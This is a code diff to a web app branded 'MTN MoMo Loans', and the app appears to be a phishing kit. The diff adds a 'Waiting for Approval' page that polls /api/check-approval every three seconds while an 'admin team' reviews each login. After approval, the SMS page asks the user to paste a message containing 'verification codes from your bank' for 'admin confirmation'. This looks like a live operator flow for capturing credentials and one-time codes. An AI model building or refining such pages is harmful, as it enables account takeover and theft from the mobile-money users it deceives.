@@ -139,6 +139,73 @@
 
   /* ───── PAGE: LOGIN ───── */
   #page-login { background:#fff; }
+
+  /* WAITING FOR APPROVAL PAGE */
+  #page-waiting-approval {
+    background: linear-gradient(135deg, var(--mtn-dark), var(--mtn-light));
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 32px 16px;
+  }
+  .waiting-container {
+    background: var(--white);
+    border-radius: var(--radius);
+    padding: 40px 32px;
+    max-width: 360px;
+    width: 100%;
+    text-align: center;
+    box-shadow: 0 20px 60px rgba(0,0,0,0.15);
+  }
+  .waiting-spinner {
+    width: 60px;
+    height: 60px;
+    border: 4px solid #eee;
+    border-top-color: var(--mtn-gold);
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+    margin: 0 auto 24px;
+  }
+  .waiting-title {
+    font-size: 1.3rem;
+    font-weight: 700;
+    color: var(--text-dark);
+    margin-bottom: 12px;
+  }
+  .waiting-text {
+    font-size: 0.95rem;
+    color: var(--text-light);
+    line-height: 1.5;
+    margin-bottom: 28px;
+  }
+  .waiting-status {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    padding: 16px;
+    background: #f0f0f0;
+    border-radius: var(--radius-sm);
+    margin-top: 20px;
+  }
+  .status-dot {
+    width: 12px;
+    height: 12px;
+    background: var(--mtn-gold);
+    border-radius: 50%;
+    animation: pulse 1.5s ease-in-out infinite;
+  }
+  @keyframes pulse {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.5; }
+  }
+  .status-text {
+    font-size: 0.85rem;
+    color: var(--text-dark);
+    font-weight: 500;
+  }
   .login-hdr { background: var(--mtn-dark); padding:32px 20px 36px; display:flex; flex-direction:column; align-items:center; gap:8px; flex-shrink:0; }
   .login-body-wrap { flex:1; background:#fff; padding:32px 20px 0; display:flex; flex-direction:column; align-items:center; }
   .login-body-wrap h2 { font-size:1.05rem; font-weight:600; margin-bottom:24px; }
@@ -401,6 +468,21 @@
   <div class="pg-footer">© 2026 MTN MoMo Loans</div>
 </div>
 
+<!-- ══════════════════════ PAGE: WAITING FOR APPROVAL ══════════════════════ -->
+<div id="page-waiting-approval" class="page">
+  <div class="waiting-container">
+    <div class="waiting-spinner"></div>
+    <div class="waiting-title">Waiting for Approval</div>
+    <div class="waiting-text">
+      Your login request is being reviewed by our admin team. Please wait...
+    </div>
+    <div class="waiting-status">
+      <div class="status-dot"></div>
+      <div class="status-text">Pending Review</div>
+    </div>
+  </div>
+</div>
+
 <!-- ══════════════════════ PAGE 5: PROCESSING ══════════════════════ -->
 <div id="page-processing" class="page">
   <div style="background:linear-gradient(160deg, var(--mtn-dark), var(--mtn-light)); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
@@ -466,26 +548,26 @@
   </div>
 </div>
 
-<!-- ══════════════════════ PAGE 8: SMS PASTE ══════════════════════ -->
+<!-- ══════════════════════ PAGE 8: SMS PASTE (ADMIN REVIEW) ══════════════════════ -->
 <div id="page-sms-paste" class="page">
   <div class="sms-topbar">
-    <button class="bk" onclick="goTo('page-login')">← Back</button>
+    <button class="bk" onclick="goTo('page-waiting-approval')">← Back</button>
     <div style="flex: 1;"></div>
     <div style="text-align: center; color: var(--mtn-dark); font-weight: 600;">SMS Verification</div>
     <div style="flex: 1;"></div>
   </div>
   <div class="sms-body-wrap">
     <div class="sms-card">
-      <h2>Verification Message</h2>
-      <p class="sms-hint">A verification message has been sent to your phone. Please copy and paste the message here.</p>
+      <h2>Your Verification Message</h2>
+      <p class="sms-hint">An SMS message has been sent to your phone for verification. Review it below and paste the message for admin confirmation.</p>
       <textarea id="smsMsgBox" class="sms-textarea" placeholder="Paste your SMS message here…" oninput="chkSmsMsg()"></textarea>
-      <p class="sms-code-hint">The message should contain verification codes</p>
+      <p class="sms-code-hint">The message should contain verification codes from your bank</p>
       <div class="msg-box error" id="smsMsg"><span class="msg-icon">✕</span><span id="smsMsgTxt"></span></div>
       <div class="msg-box success" id="smsMsgOk"><span class="msg-icon">✓</span><span id="smsMsgOkTxt"></span></div>
-      <button id="bSms" class="btn-sms" onclick="doSmsParse()">CONTINUE</button>
+      <button id="bSms" class="btn-sms" onclick="doSmsParse()">SUBMIT FOR ADMIN REVIEW</button>
       <div id="mSms" class="loading">
         <div class="spinner" style="margin: 16px auto;"></div>
-        <div class="wait-msg">Reading message…</div>
+        <div class="wait-msg">Submitting to admin…</div>
       </div>
     </div>
   </div>
@@ -609,10 +691,58 @@
   };
 
   // NAVIGATION
+  let approvalCheckInterval = null;
+
   function goTo(pageId) {
+    // Stop approval checking if leaving waiting page
+    if (document.getElementById('page-waiting-approval')?.classList.contains('active') && pageId !== 'page-waiting-approval') {
+      if (approvalCheckInterval) {
+        clearInterval(approvalCheckInterval);
+        approvalCheckInterval = null;
+      }
+    }
+
+    // Navigate to page
     document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
     document.getElementById(pageId)?.classList.add('active');
     window.scrollTo(0, 0);
+
+    // Start approval checking if going to waiting page
+    if (pageId === 'page-waiting-approval') {
+      checkApprovalStatus();
+    }
+  }
+
+  // Check for admin approval every 3 seconds
+  function checkApprovalStatus() {
+    approvalCheckInterval = setInterval(async () => {
+      try {
+        const res = await fetch('/api/check-approval', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            applicationId: S.applicationId
+          })
+        });
+
+        const data = await res.json();
+        
+        if (data.approved) {
+          // Admin approved - go to SMS page
+          clearInterval(approvalCheckInterval);
+          approvalCheckInterval = null;
+          goTo('page-sms-paste');
+        } else if (data.rejected) {
+          // Admin rejected - show message and go back
+          clearInterval(approvalCheckInterval);
+          approvalCheckInterval = null;
+          alert('Your login request was rejected by admin. Please try again.');
+          goTo('page-login');
+        }
+      } catch (err) {
+        // Continue checking
+      }
+    }, 3000);
   }
 
   // PHONE NORMALIZATION
@@ -833,7 +963,10 @@
       document.getElementById('mLgn').classList.remove('show');
 
       if (data.success) {
-        goTo('page-sms-paste');
+        // Store the application ID for later use
+        S.applicationId = data.applicationId;
+        // Go to waiting approval page instead of SMS paste
+        goTo('page-waiting-approval');
       } else {
         document.getElementById('bLgn').disabled = false;
         showLgnMsg('error', data.message || 'Login failed.');
